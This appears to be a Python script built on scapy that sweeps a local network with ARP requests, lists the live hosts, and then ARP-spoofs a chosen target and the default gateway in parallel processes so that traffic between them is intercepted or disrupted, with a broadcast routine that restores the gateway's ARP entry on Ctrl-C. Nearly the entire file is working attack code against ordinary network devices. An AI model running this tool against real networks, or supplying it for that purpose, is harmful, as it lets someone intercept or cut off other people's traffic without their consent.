
import multiprocessing
from getmac import get_mac_address
import scapy.all as scapy
import time

#function gets the subnet mask in either CIDR notation or dotted dicimal format that is changed to CIDR.
def GetMask() ->str:
    try:
        subnet_mask = input("enter the subnet mask (e.g. 255.255.255.0 or 1-32): ")
        if subnet_mask.count(".") != 3:
            return subnet_mask
        subnet_mask = subnet_mask.split(".")
        maskCounter = 0
        for i in range(len(subnet_mask)):
            bin_num = bin(int(subnet_mask[i])).replace("0b", "")
            for j in range(len(str(bin_num))):
                if bin_num[j] == '1':
                    maskCounter += 1
                else:
                    break
    except ValueError:
        print("Invalid subnet mask format. Please enter a valid subnet mask format.")    
        return GetMask()   
    return str(maskCounter)
    
        
#scans the network for devices and stores their IP and MAC addresses in a dictionary.
def scan(Default, Targetdict,mask, my_ip):
    print("the routers mac: ",Default+"/"+mask)
    response,_= scapy.srp(scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/scapy.ARP(pdst=defaultGatway+"/"+mask), timeout=4, verbose=0)
    for packet in response:
        # If the response contains an answer, extract the IP and MAC address.
        if packet.answer.psrc==my_ip or packet.answer.psrc==Default:
            continue
        Targetdict[packet.answer.psrc] = packet.answer.hwsrc     

    #pdst: target IP address 
    #hwdst:target mac address
    #psrc: source IP address
    #hwsrc: source mac address

def spoof(Target_ip, Target_mac,Src_ip, verbose):
    self_mac = scapy.get_if_hwaddr(scapy.conf.iface)
    print("self mac: " + self_mac)
    arp_response = scapy.ARP(pdst=Target_ip, hwdst=Target_mac, psrc=Src_ip, op='is-at',) 
    ether = scapy.Ether(dst=Target_mac)
    packet = ether / arp_response
    print("currently spoofing: " + Target_ip + " with " + self_mac + " as the source MAC address")
    while True:
        # Continuously send ARP responses to spoof the target
        try:
            scapy.sendp(packet, count=2,  verbose=0)
            time.sleep(2)  # Sleep to avoid flooding the network
        except KeyboardInterrupt:
            if(verbose):
                print(f"Sent ARP response: {Src_ip}:is-at {self_mac} to disable {Target_ip}")
                break

def restore(Router_ip, verbose):
    router_mac = get_mac_address(ip=Router_ip)
    arp_response=scapy.ARP(hwdst="ff:ff:ff:ff:ff:ff", psrc=Router_ip, hwsrc=router_mac, op='is-at')    
    ether = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether / arp_response
    scapy.sendp(packet, count=8, verbose=0)
    if(verbose):
        print(f"Sent broadcast ARP response: {Router_ip} is-at {router_mac} ")



if __name__ == "__main__":
    defaultGatway = input("Enter the default gateway: ")
    Router_mac = get_mac_address(ip=defaultGatway)
    mask = GetMask()
    network=defaultGatway.split(".")
    networkNums=network[0]+"."+network[1]+"."+network[2]+"."
    network=defaultGatway.split(".")
    manager = multiprocessing.Manager()
    Targetdict = manager.dict()
    my_ip = scapy.get_if_addr(scapy.conf.iface)
    scan(defaultGatway, Targetdict, mask, my_ip)
    #if the Targetdict is empty, it means no live devices were found in the network.
    if(not Targetdict):
        print("No live devices found in the network.")
        exit(0)
    #else, print the live devices found in the network.
    print("Live device found: ")
    for key,value in Targetdict.items():
       print(f"IP: {key}, MAC: {value}")

    try:
        while True:
            key= input("Enter the target IP address to spoof (or 'cntl c' to quit): ")
            value= Targetdict[key]        
            p1=multiprocessing.Process(target=spoof, args=[key,value,defaultGatway,True])      
            p2=multiprocessing.Process(target=spoof, args=[defaultGatway,Router_mac,key,True])
            p1.start()
            p2.start()
            time.sleep(2)
    except KeyboardInterrupt:
        print("cntl c was pressed, stopping ARP spoofing..")
        restore(defaultGatway,True)




